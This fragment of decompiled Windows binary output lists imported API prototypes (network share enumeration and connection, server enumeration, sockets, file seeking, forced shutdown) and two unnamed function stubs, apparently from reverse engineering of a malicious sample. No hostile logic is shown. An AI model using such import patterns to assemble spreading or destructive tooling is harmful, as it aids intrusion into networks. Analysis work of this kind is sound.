// UINT __stdcall GetWindowsDirectoryW(LPWSTR lpBuffer, UINT uSize);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// BOOL __stdcall SetFilePointerEx(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HRSRC __stdcall FindResourceW(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCancelConnection2W(LPCWSTR lpName, DWORD dwFlags, BOOL fForce);
// DWORD __stdcall WNetAddConnection2W(LPNETRESOURCEW lpNetResource, LPCWSTR lpPassword, LPCWSTR lpUserName, DWORD dwFlags);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall NetServerEnum(LPCWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, DWORD servertype, LPCWSTR domain, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall NetServerGetInfo(LPWSTR servername, DWORD level, LPBYTE *bufptr);
// LPWSTR *__stdcall CommandLineToArgvW(LPCWSTR lpCmdLine, int *pNumArgs);
// HRESULT __stdcall SHGetFolderPathW(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);
// BOOL __stdcall PathAppendW(LPWSTR pszPath, LPCWSTR pMore);
// int __stdcall StrToIntW(_DWORD); weak
// LPWSTR __stdcall PathFindFileNameW(LPCWSTR pszPath);
// BOOL __stdcall PathFileExistsW(LPCWSTR pszPath);
// int __stdcall StrCmpW(_DWORD, _DWORD); weak
// int __stdcall StrCmpIW(_DWORD, _DWORD); weak
// int __stdcall StrChrW(_DWORD, _DWORD); weak
// int __thiscall StrCatW(_DWORD, _DWORD, _DWORD); weak
// int __stdcall StrStrW(_DWORD, _DWORD); weak
// LPWSTR __stdcall PathFindExtensionW(LPCWSTR pszPath);
// LPWSTR __stdcall PathCombineW(LPWSTR pszDest, LPCWSTR pszDir, LPCWSTR pszFile);
// int __stdcall StrStrIW(_DWORD, _DWORD); weak
// BOOL __stdcall ExitWindowsEx(UINT uFlags, DWORD dwReason);
// int wsprintfA(LPSTR, LPCSTR, ...);
// int wsprintfW(LPWSTR, LPCWSTR, ...);
// char *__stdcall inet_ntoa(struct in_addr in);
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall _WSAFDIsSet(SOCKET fd, fd_set *);
// u_long __stdcall ntohl(u_long netlong);
// int __stdcall ioctlsocket(SOCKET s, __int32 cmd, u_long *argp);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// unsigned __int32 __stdcall inet_addr(const char *cp);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// u_short __stdcall htons(u_short hostshort);
// int __stdcall closesocket(SOCKET s);
// SOCKET __stdcall socket(int af, int type, int protocol);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __cdecl rand();
// HRESULT __stdcall CoCreateGuid(GUID *pguid);
// void __stdcall CoTaskMemFree(LPVOID pv);
// HRESULT __stdcall StringFromCLSID(const IID *const rclsid, LPOLESTR *lplpsz);
int __cdecl sub_73C365C0(int a1);
unsigned __int8 *__cdecl sub_73C36670(unsigned __int8 *a1, unsigned __int8 a2, unsigned int a3);
